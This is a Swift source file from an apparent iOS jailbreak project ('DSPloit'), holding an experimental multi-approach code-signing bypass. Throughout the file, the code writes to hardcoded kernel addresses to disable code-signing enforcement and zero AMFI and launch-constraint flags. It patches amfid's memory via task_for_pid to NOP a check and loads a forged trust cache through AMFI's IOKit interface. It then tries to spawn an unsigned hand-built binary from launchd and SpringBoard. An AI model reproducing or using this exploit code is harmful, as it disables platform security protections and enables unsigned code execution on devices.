//
//  exp_multi_bypass.swift
//  DSPloit
//
//  EXPERIMENT: Try ALL bypass approaches sequentially
//  Based on mass Ghidra scan findings (2026-05-30)
//
//  Approaches (in order):
//  A. amfid NOP via task_for_pid (launchd)
//  B. IOKit TC load (selector 1 — proven once)
//  C. Launch constraint disable (writable AMFI flags)
//  D. posix_spawn with CS_DEBUGGED on target
//  E. Direct spawn from launchd (PID 1 context)
//
//  Created by Royan | 2026-05-30
//

import Foundation
import CommonCrypto

final class ExpMultiBypass {
    static let shared = ExpMultiBypass()
    var onLog: ((String) -> Void)?
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(exp_multi) \(msg)")
    }
    
    func runAsync() {
        #if !DISABLE_REMOTECALL
        guard dspmgr.shared.dsready, dspmgr.shared.rcready else {
            log("❌ Need KRW + RC"); return
        }
        
        log("══════════════════════════════════════")
        log("  Multi-Bypass (all approaches)")
        log("══════════════════════════════════════")
        log("")
        
        // Prep: write test binary + set kernel flags
        prepareEnvironment()
        
        // Run approaches sequentially
        DispatchQueue.main.asyncAfter(deadline: .now() + 1) { self.approachA() }
        #else
        log("❌ DISABLE_REMOTECALL")
        #endif
    }
    
    #if !DISABLE_REMOTECALL
    private var testBinPath = ""
    
    // MARK: - Prepare
    
    private func prepareEnvironment() {
        let slide = ds_get_kernel_slide()
        
        // 1. cs_enforcement_disable = 1 (proven writable)
        ds_kwrite32(0xfffffff00a160798 &+ slide, 1)
        log("✅ cs_enforcement_disable = 1")
        
        // 2. Zero AMFI enforcement flags
        let amfiBase: UInt64 = 0xfffffff00a330098 &+ slide
        for off: UInt64 in [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408] {
            ds_kwrite64(amfiBase &+ off, 0)
        }
        log("✅ AMFI 10 flags zeroed")
        
        // 3. Zero launch constraint enforcement (NEW from research)
        // These are function pointers in AMFI __DATA — zero = disable
        let lcOffsets: [UInt64] = [0x1e0, 0x228, 0x270] // launch constraint related
        for off in lcOffsets {
            let current = ds_kread64(amfiBase &+ off)
            if current != 0 {
                ds_kwrite64(amfiBase &+ off, 0)
            }
        }
        log("✅ Launch constraints zeroed")
        
        // 4. Write test binary
        let bin = buildBinary()
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        testBinPath = docs + "/multi_test"
        try? bin.write(to: URL(fileURLWithPath: testBinPath))
        log("✅ Test binary written")
        log("")
    }
    
    // MARK: - Approach A: amfid NOP via task_for_pid
    
    private func approachA() {
        log("── [A] amfid NOP via task_for_pid ──")
        
        // Step 1: Find amfid PID via C code (proven working)
        let initResult = amfi_bypass_init()
        guard initResult == 0 else {
            log("❌ amfi_bypass_init failed")
            approachB()
            return
        }
        
        // amfi_bypass_hijack_amfid finds amfid + patches cs_flags
        let hijackOk = amfi_bypass_hijack_amfid()
        guard hijackOk else {
            log("❌ amfid not found or cs_flags patch failed")
            approachB()
            return
        }
        
        // Extract PID from status
        let status = String(cString: amfi_bypass_status())
        log("Status: \(status)")
        
        var amfidPid: Int32 = -1
        if let r = status.range(of: "pid="), let e = status[r.upperBound...].firstIndex(of: ")") {
            amfidPid = Int32(status[r.upperBound..<e]) ?? -1
        }
        
        guard amfidPid > 0 else {
            log("❌ Cannot extract amfid PID")
            approachB()
            return
        }
        log("amfid PID: \(amfidPid)")
        
        // Step 2: task_for_pid from launchd
        RootExecutor.shared.executeAsRoot(operation: "multi_tfp") { rc in
            let portAddr = rc.trojanMem + 0x100
            rc[portAddr].setValue32(0)
            
            let ret = RootExecutor.rcall(rc, "task_for_pid",
                UInt64(mach_task_self_), UInt64(amfidPid), portAddr)
            let port = rc[portAddr].value32()
            
            guard ret == 0 && port != 0 else {
                return (false, "task_for_pid: ret=\(ret) port=\(port)", UInt64(ret))
            }
            
            // Step 3: mach_vm_region to find text base
            let addrBuf = rc.trojanMem + 0x200
            let sizeBuf = rc.trojanMem + 0x208
            let infoBuf = rc.trojanMem + 0x210
            let cntBuf = rc.trojanMem + 0x280
            let objBuf = rc.trojanMem + 0x290
            
            rc[addrBuf].setValue64(0) // start from 0
            rc[sizeBuf].setValue64(0)
            rc[cntBuf].setValue32(9)
            
            let regionRet = RootExecutor.rcall(rc, "mach_vm_region",
                UInt64(port), addrBuf, sizeBuf, 9, infoBuf, cntBuf, objBuf)
            
            let textBase = rc[addrBuf].value64()
            
            guard regionRet == 0 && textBase > 0x100000000 else {
                return (false, "mach_vm_region: ret=\(regionRet) base=0x\(String(textBase, radix:16))", UInt64(regionRet))
            }
            
            let patchAddr = textBase + 0x2ec8
            
            // Step 4: mach_vm_protect
            let pageAddr = patchAddr & ~0xFFF
            let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
                UInt64(port), pageAddr, 0x4000, 0, 7)
            
            guard protRet == 0 else {
                return (false, "vm_protect: ret=\(protRet)", UInt64(protRet))
            }
            
            // Step 5: Read + verify cbz
            let readBuf = rc.trojanMem + 0x300
            let readSzBuf = rc.trojanMem + 0x310
            rc[readSzBuf].setValue64(4)
            RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                UInt64(port), patchAddr, 4, readBuf, readSzBuf)
            let insn = rc[readBuf].value32()
            
            guard (insn & 0xFF000000) == 0x34000000 else {
                return (false, "not cbz: 0x\(String(format:"%08x",insn)) at 0x\(String(patchAddr,radix:16))", UInt64(insn))
            }
            
            // Step 6: Write NOP
            let nopBuf = rc.trojanMem + 0x320
            rc[nopBuf].setValue32(0xD503201F)
            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
                UInt64(port), patchAddr, nopBuf, 4)
            
            if writeRet == 0 {
                return (true, "✅ PATCHED cbz→NOP at 0x\(String(patchAddr,radix:16))", 0)
            }
            return (false, "vm_write: ret=\(writeRet)", UInt64(writeRet))
        }
        
        // Poll result
        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [self] in
            if let r = RootExecutor.shared.lastResult, r.operation == "multi_tfp" {
                log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
                if r.success {
                    log("")
                    testSpawn(label: "A")
                    return
                }
            }
            approachB()
        }
    }
    
    // MARK: - Approach B: IOKit TC Load (selector 1)
    
    private func approachB() {
        log("")
        log("── [B] IOKit TC Load (selector 1) ──")
        
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ No SpringBoard RC")
            approachC()
            return
        }
        
        // Build TC with correct CDHash
        let bin = try! Data(contentsOf: URL(fileURLWithPath: testBinPath))
        let cdhash = sha256t20(bin)
        let tcData = buildTC(cdhash: cdhash)
        log("CDHash: \(cdhash.map{String(format:"%02x",$0)}.joined())")
        
        // IOKit calls
        let amfiStr = remote_alloc_str(sb, "AppleMobileFileIntegrity")
        let matching = RootExecutor.rcall(sb, "IOServiceMatching", amfiStr)
        guard matching != 0 else { log("❌ IOServiceMatching=0"); approachC(); return }
        
        let service = RootExecutor.rcall(sb, "IOServiceGetMatchingService", 0, matching)
        guard service != 0 else { log("❌ service=0"); approachC(); return }
        log("AMFI service: 0x\(String(service, radix:16))")
        
        let connAddr = sb.trojanMem + 0x2800
        sb[connAddr].setValue32(0)
        let kr = RootExecutor.rcall(sb, "IOServiceOpen", service, 0x103, 0, connAddr)
        let conn = sb[connAddr].value32()
        log("IOServiceOpen: kr=0x\(String(kr,radix:16)) conn=0x\(String(conn,radix:16))")
        
        guard kr == 0 && conn != 0 else {
            log("❌ IOServiceOpen failed")
            approachC()
            return
        }
        
        // Write TC + call selector 1
        let tcBuf = sb.trojanMem + 0x3000
        tcData.withUnsafeBytes { sb.remote_write(tcBuf, from: $0.baseAddress!, size: UInt64(tcData.count)) }
        let outBuf = sb.trojanMem + 0x4000
        let outSz = sb.trojanMem + 0x4800
        sb[outSz].setValue64(256)
        
        let r = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
            UInt64(conn), 1, tcBuf, UInt64(tcData.count), outBuf, outSz)
        log("Selector 1: 0x\(String(r, radix:16))")
        
        if r == 0 {
            log("✅ TC loaded via selector 1!")
            testSpawn(label: "B")
        } else {
            // Try selector 2
            sb[outSz].setValue64(256)
            let r2 = RootExecutor.rcall(sb, "IOConnectCallStructMethod",
                UInt64(conn), 2, tcBuf, UInt64(tcData.count), outBuf, outSz)
            log("Selector 2: 0x\(String(r2, radix:16))")
            if r2 == 0 {
                log("✅ TC loaded via selector 2!")
                testSpawn(label: "B")
            } else {
                approachC()
            }
        }
    }
    
    // MARK: - Approach C: Spawn with CS_DEBUGGED
    
    private func approachC() {
        log("")
        log("── [C] Spawn + patch cs_flags on child ──")
        log("Spawning binary, then immediately patching its cs_flags")
        
        RootExecutor.shared.executeAsRoot(operation: "multi_spawn_patch") { [self] rc in
            let pathAddr = remote_alloc_str(rc, testBinPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = rc.trojanMem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            
            // Try posix_spawn with POSIX_SPAWN_START_SUSPENDED
            // This spawns but doesn't exec yet — gives us time to patch
            let attrAddr = rc.trojanMem + 0xB00
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            // POSIX_SPAWN_START_SUSPENDED = 0x0080
            let flagsAddr = rc.trojanMem + 0xB80
            rc[flagsAddr].setValue16(0x0080)
            RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x0080)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, attrAddr, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if ret == 0 && pid != 0 {
                return (true, "spawned suspended pid=\(pid)", UInt64(pid))
            }
            return (false, "spawn failed ret=\(ret) pid=\(pid)", UInt64(ret))
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [self] in
            if let r = RootExecutor.shared.lastResult, r.operation == "multi_spawn_patch" {
                if r.success {
                    let pid = Int32(r.returnValue)
                    log("✅ Spawned suspended: PID \(pid)")
                    // Patch its cs_flags
                    amfi_bypass_prepare_spawn(pid)
                    // Resume
                    kill(pid, SIGCONT)
                    log("Resumed PID \(pid) — checking if alive...")
                    usleep(200000)
                    if kill(pid, 0) == 0 {
                        log("✅✅✅ PROCESS ALIVE! PID=\(pid)")
                        log("🎉 UNSIGNED CODE RUNNING!")
                    } else {
                        log("❌ Process killed (AMFI still active)")
                    }
                } else {
                    log("❌ \(r.message)")
                }
            }
            self.approachD()
        }
    }
    
    // MARK: - Approach D: Direct spawn from launchd
    
    private func approachD() {
        log("")
        log("── [D] Direct posix_spawn from launchd ──")
        log("launchd (PID 1) may bypass some AMFI checks")
        
        RootExecutor.shared.executeAsRoot(operation: "multi_launchd_spawn") { [self] rc in
            let pathAddr = remote_alloc_str(rc, testBinPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = rc.trojanMem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            return (ret == 0 && pid != 0, "ret=\(ret) pid=\(pid)", UInt64(pid))
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [self] in
            if let r = RootExecutor.shared.lastResult, r.operation == "multi_launchd_spawn" {
                if r.success {
                    log("✅✅✅ SPAWNED FROM LAUNCHD! PID=\(r.returnValue)")
                    log("🎉 FULL JAILBREAK!")
                } else {
                    log("❌ \(r.message)")
                }
            }
            self.approachE()
        }
    }
    
    // MARK: - Approach E: SpringBoard spawn (already has get-task-allow)
    
    private func approachE() {
        log("")
        log("── [E] posix_spawn from SpringBoard ──")
        
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ No SB RC"); summary(); return
        }
        
        let pathAddr = remote_alloc_str(sb, testBinPath)
        RootExecutor.rcall(sb, "chmod", pathAddr, 0o755)
        
        let pidAddr = sb.trojanMem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = sb.trojanMem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        
        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        log("posix_spawn: ret=\(ret) pid=\(pid)")
        if ret == 0 && pid != 0 {
            log("✅✅✅ SPAWNED FROM SPRINGBOARD! PID=\(pid)")
            log("🎉 FULL JAILBREAK!")
        } else {
            log("❌ ret=\(ret) (EPERM)")
        }
        
        summary()
    }
    
    // MARK: - Test Spawn (after successful TC load or amfid patch)
    
    private func testSpawn(label: String) {
        log("Testing spawn after approach \(label)...")
        
        guard let sb = dspmgr.shared.sbProc else { return }
        let pathAddr = remote_alloc_str(sb, testBinPath)
        RootExecutor.rcall(sb, "chmod", pathAddr, 0o755)
        let pidAddr = sb.trojanMem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = sb.trojanMem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        if ret == 0 && pid != 0 {
            log("✅✅✅ UNSIGNED SPAWN SUCCESS! PID=\(pid)")
            log("🎉 APPROACH \(label) WORKS!")
        } else {
            log("❌ Spawn still fails: ret=\(ret)")
        }
    }
    
    // MARK: - Summary
    
    private func summary() {
        log("")
        log("══════════════════════════════════════")
        log("  All approaches attempted.")
        log("  Check results above.")
        log("══════════════════════════════════════")
    }
    #endif
    
    // MARK: - Helpers
    
    private func buildBinary() -> Data {
        var bin = Data()
        bin.append(contentsOf: [
            0xCF,0xFA,0xED,0xFE, 0x0C,0x00,0x00,0x01,
            0x00,0x00,0x00,0x00, 0x02,0x00,0x00,0x00,
            0x02,0x00,0x00,0x00, 0x60,0x01,0x00,0x00,
            0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00
        ])
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0]=0x19;seg[4]=0x48
        seg[8]=0x5F;seg[9]=0x5F;seg[10]=0x54;seg[11]=0x45;seg[12]=0x58;seg[13]=0x54
        seg[28]=0x01;seg[32]=0x00;seg[33]=0x40;seg[40]=0x00;seg[41]=0x40
        seg[48]=0x05;seg[52]=0x05
        bin.append(contentsOf: seg)
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0]=0x05;thr[4]=0x18;thr[5]=0x01;thr[8]=0x06;thr[12]=0x44
        thr[272]=0x80;thr[273]=0x01;thr[276]=0x01
        bin.append(contentsOf: thr)
        while bin.count < 0x180 { bin.append(0) }
        bin.append(contentsOf: [0x00,0x00,0x80,0xD2,0x30,0x00,0x80,0xD2,0x01,0x10,0x00,0xD4])
        while bin.count < 0x4000 { bin.append(0) }
        return bin
    }
    
    private func buildTC(cdhash: Data) -> Data {
        var tc = Data()
        var v: UInt32 = 2; tc.append(Data(bytes: &v, count: 4))
        var uuid = UUID().uuid; tc.append(Data(bytes: &uuid, count: 16))
        var c: UInt32 = 1; tc.append(Data(bytes: &c, count: 4))
        tc.append(cdhash.prefix(20))
        if cdhash.count < 20 { tc.append(Data(repeating: 0, count: 20 - cdhash.count)) }
        var ht: UInt8 = 2; var fl: UInt8 = 0; var cn: UInt16 = 2
        tc.append(Data(bytes: &ht, count: 1))
        tc.append(Data(bytes: &fl, count: 1))
        tc.append(Data(bytes: &cn, count: 2))
        return tc
    }
    
    private func sha256t20(_ data: Data) -> Data {
        var hash = [UInt8](repeating: 0, count: Int(CC_SHA256_DIGEST_LENGTH))
        data.withUnsafeBytes { CC_SHA256($0.baseAddress, CC_LONG(data.count), &hash) }
        return Data(hash.prefix(20))
    }
}
